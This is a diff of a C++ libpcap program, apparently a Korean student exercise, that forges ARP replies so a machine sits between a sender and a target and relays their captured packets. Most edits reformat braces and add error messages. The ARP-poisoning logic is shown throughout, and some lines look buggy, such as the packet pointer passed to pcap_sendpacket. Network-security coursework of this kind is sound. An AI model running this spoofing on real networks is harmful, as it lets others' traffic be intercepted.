@@ -12,8 +12,7 @@ void usage() {
 	printf("sample: send-arp-test wlan0\n");
 }
 
-struct Session
-{
+struct Session {
     /*
     Ip   senderIp = Sender의 IP를 담기 위한 구조체
     Mac  senderMac = Sender의 Mac을 담기 위한 구조체
@@ -34,8 +33,7 @@ Ip My_IP;
 
 /* 맥 주소 읽어오는 함수 참고 링크 */
 /* https://bit.ly/3wkFJLt */
-int get_MyMac(char *mac_str, const char *if_name)
-{
+int get_MyMac(char *mac_str, const char *if_name) {
 	struct sockaddr macaddr;
 	struct ifreq ifr;
 	int	ret = 0;
@@ -64,24 +62,21 @@ int get_MyMac(char *mac_str, const char *if_name)
 
 /* IP 주소 읽어오는 함수 참고 링크 */
 /* https://bit.ly/3caDmE8 */
-int get_myIP(char *ip_str, const char *if_name)
-{
+int get_myIP(char *ip_str, const char *if_name) {
 	struct sockaddr		ip_addr;
 	struct sockaddr_in 	*ip_addr_2;
 	struct ifreq ifr;
 	int	ret = 0;
 	int	fd;
 	
-	if((fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) 
-	{
+	if((fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
         printf("소켓 정보를 읽어올 수 없습니다.\n");
 		return -1;
 	}
 	
 	memset(&ifr, 0, sizeof(ifr));
 	strcpy(ifr.ifr_name, if_name);
-	if(ioctl(fd, SIOCGIFADDR, &ifr) == 0)
-	{
+	if(ioctl(fd, SIOCGIFADDR, &ifr) == 0){
 		memcpy(&ip_addr, &ifr.ifr_addr, sizeof(struct sockaddr));
 		ip_addr_2 = (struct sockaddr_in*)&ip_addr;
 		strcpy(ip_str, inet_ntoa(ip_addr_2->sin_addr));
@@ -93,8 +88,7 @@ int get_myIP(char *ip_str, const char *if_name)
 }
 
 // 구조체를 통해 입력받은 SenderIp 값을 통해 Mac 반환
-Mac requestMac(pcap_t* handle, Ip senderIp)
-{
+Mac requestMac(pcap_t* handle, Ip senderIp) {
     EthArpPacket Packet;
 
     Packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
@@ -129,8 +123,7 @@ Mac requestMac(pcap_t* handle, Ip senderIp)
     // 지속적인 Reply 를 위해 선언
     EthArpPacket* receive_packet = nullptr;
     
-    while(1)
-    {
+    while(1) {
         struct pcap_pkthdr* header;
         const  u_char*      packet;
         int res = pcap_next_ex(handle, &header, &packet);
@@ -159,8 +152,7 @@ Mac requestMac(pcap_t* handle, Ip senderIp)
 }
 
 // 선언해두었던 session을 이용하여 ARp relay 진행
-void send_Arp_relay(Session* session)
-{
+void send_Arp_relay(Session* session) {
     session->Arp_relay.eth_.dmac_ = session->senderMac;
     session->Arp_relay.eth_.smac_ = My_Mac;
     session->Arp_relay.eth_.type_ = htons(EthHdr::Arp);
@@ -222,9 +214,11 @@ int main(int argc, char* argv[]) {
 
     //각 함수 값이 올바르게 들어오지 않은 경우 종료
 	if(!get_MyMac(m_MAC, dev)){
+        printf("올바르지 않은 MAC 주소값입니다! \n");
 		exit(1);
 	}
 	if(!get_myIP(m_IP, dev)){
+        printf("올바르지 않은 IP 주소값입니다! \n");
 		exit(1);
 	}
 
@@ -246,8 +240,7 @@ int main(int argc, char* argv[]) {
     }
 
     // argv 값을 통해 세션에 대한 IP 값 입력 받기
-    for(int i = 2; i < argc; i+=2)
-    {
+    for(int i = 2; i < argc; i+=2) {
         /* argv[0] : ./send-arp-test
         argv[1] : interface
         argv[2] : sendIP
@@ -258,20 +251,19 @@ int main(int argc, char* argv[]) {
         printf("[세션 번호 #%d] 타겟의 IP 주소 = %s\n", (i/2)-1, argv[i+1]);
     }
     
-    // Victim Mac Address 와 같이 ARP 변조에 필요한 값 얻어옴
-    for(int i = 0; i < Session_Number; i++)
-    {
+    // Sender Mac Address / Targer Mac Address 와 같이 ARP 변조에 필요한 값 얻어옴
+    for(int i = 0; i < Session_Number; i++) {
         session[i].senderMac = requestMac(handle, session[i].senderIp);
         session[i].targetMac = requestMac(handle, session[i].targetIp);
         send_Arp_relay(&session[i]);
-        printf("패킷 전송을 위해 Victim Mac Address 를 얻어옵니다 . . . \n");
+        printf("패킷 전송을 위해 Sender Mac Address 를 얻어옵니다 . . . \n");
+        printf("패킷 전송을 위해 Target Mac Address 를 얻어옵니다 . . . \n");
     }
     
     printf("ARP 정보 변조 성공!\n");
 
     // ARP Packet 변조
-    for(int i = 0; i < Session_Number; i++)
-    {
+    for(int i = 0; i < Session_Number; i++) {
         int res = pcap_sendpacket(
             handle, 
             reinterpret_cast<const u_char*>( &(session[i],send_Arp_relay) ), 
@@ -282,7 +274,7 @@ int main(int argc, char* argv[]) {
     }
 
     // relay 하기 위해 반복
-    while(true){
+    while(true) {
         struct pcap_pkthdr* header;
         const  u_char*      packet;
         int res = pcap_next_ex(handle, &header, &packet);
@@ -298,8 +290,7 @@ int main(int argc, char* argv[]) {
         bpf_u_int32  Packet_spoof_size = header->caplen;
 
         // 세션에 대하여 패킷과 비교
-        for(int i = 0; i < Session_Number; i++)
-        {
+        for(int i = 0; i < Session_Number; i++) {
             if(Packet_spoof->smac() != session[i].senderMac){ // sender의 Mac 이 아닌 경우
                 if(Packet_spoof->dmac() != My_Mac){ // 나에게 relay 된 것이 아닌 경우
                     continue;  
